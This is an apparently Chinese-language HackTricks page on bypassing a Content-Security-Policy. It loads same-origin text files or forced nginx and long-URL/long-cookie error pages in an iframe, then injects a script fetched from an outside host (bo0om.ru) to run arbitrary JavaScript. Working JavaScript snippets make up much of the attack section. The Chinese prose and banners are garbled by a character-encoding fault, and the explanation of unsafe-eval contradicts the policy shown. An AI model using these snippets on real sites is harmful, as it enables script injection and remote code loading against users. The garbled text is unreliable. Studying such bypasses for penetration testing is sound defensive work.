<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€ä¸ª**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>


ä¸€ä¸ªå¦‚ä¸‹çš„é…ç½®ï¼š
```
Content-Security-Policy: default-src â€˜selfâ€™ â€˜unsafe-inlineâ€™;
```
ç¦æ­¢ä½¿ç”¨å°†ä»£ç ä½œä¸ºå­—ç¬¦ä¸²ä¼ è¾“å¹¶æ‰§è¡Œçš„ä»»ä½•å‡½æ•°ã€‚ä¾‹å¦‚ï¼š`eval, setTimeout, setInterval`ï¼Œç”±äºè®¾ç½®äº†`unsafe-eval`ï¼Œæ‰€æœ‰è¿™äº›å‡½æ•°éƒ½å°†è¢«é˜»æ­¢ã€‚

ä»»ä½•æ¥è‡ªå¤–éƒ¨æºçš„å†…å®¹ä¹Ÿä¼šè¢«é˜»æ­¢ï¼ŒåŒ…æ‹¬å›¾åƒã€CSSã€WebSocketsï¼Œå°¤å…¶æ˜¯JSã€‚

## é€šè¿‡æ–‡æœ¬å’Œå›¾åƒ

ç°ä»£æµè§ˆå™¨å°†å›¾åƒå’Œæ–‡æœ¬è½¬æ¢ä¸ºHTMLæ–‡ä»¶ä»¥æ›´å¥½åœ°å¯è§†åŒ–å®ƒä»¬ï¼ˆè®¾ç½®èƒŒæ™¯ã€å±…ä¸­ç­‰ï¼‰ã€‚

å› æ­¤ï¼Œå¦‚æœä½ ä½¿ç”¨ä¸€ä¸ª`iframe`æ‰“å¼€ä¸€ä¸ªå›¾åƒæˆ–æ–‡æœ¬æ–‡ä»¶ï¼Œæ¯”å¦‚`favicon.ico`æˆ–`robots.txt`ï¼Œä½ å°†ä»¥HTMLå½¢å¼æ‰“å¼€å®ƒã€‚

**è¿™äº›é¡µé¢é€šå¸¸æ²¡æœ‰CSPå¤´ï¼Œå¹¶ä¸”å¯èƒ½æ²¡æœ‰X-Frame-Options**ï¼Œå› æ­¤ä½ å¯ä»¥ä»ä¸­æ‰§è¡Œä»»æ„JSä»£ç ï¼š
```javascript
frame=document.createElement("iframe");
frame.src="/css/bootstrap.min.css";
document.body.appendChild(frame);
script=document.createElement('script');
script.src='//bo0om.ru/csp.js';
window.frames[0].document.head.appendChild(script);
```
## é€šè¿‡é”™è¯¯

ä¸æ–‡æœ¬æ–‡ä»¶æˆ–å›¾åƒä¸€æ ·ï¼Œ**é”™è¯¯å“åº”é€šå¸¸æ²¡æœ‰CSPå¤´ï¼Œå¹¶ä¸”å¯èƒ½æ²¡æœ‰X-Frame-Options**ã€‚å› æ­¤ï¼Œæ‚¨å¯ä»¥å¼ºåˆ¶å‘ç”Ÿé”™è¯¯å¹¶å°†å…¶åŠ è½½åˆ°iframeä¸­ï¼š
```javascript
// Force nginx error
frame=document.createElement("iframe");
frame.src="/%2e%2e%2f";
document.body.appendChild(frame);

// Force error via long URL
frame=document.createElement("iframe");
frame.src="/"+"A".repeat(20000);
document.body.appendChild(frame);

// Force error via long cookies
for(var i=0;i<5;i++){document.cookie=i+"="+"a".repeat(4000)};
frame=document.createElement("iframe");
frame.src="/";
document.body.appendChild(frame);
// Don't forget to remove them
for(var i=0;i<5;i++){document.cookie=i+"="}
```

```javascript
// After any of the previous examples, you can execute JS in the iframe with something like:
script=document.createElement('script');
script.src='//bo0om.ru/csp.js';
window.frames[0].document.head.appendChild(script);
```
## å‚è€ƒèµ„æ–™

* [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨ HackTricks ä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–æœ€æ–°ç‰ˆæœ¬çš„ PEASS æˆ–ä¸‹è½½ PDF æ ¼å¼çš„ HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶ NFT æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å¾—[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)

- **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘ [hacktricks ä»“åº“](https://github.com/carlospolop/hacktricks) å’Œ [hacktricks-cloud ä»“åº“](https://github.com/carlospolop/hacktricks-cloud) æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
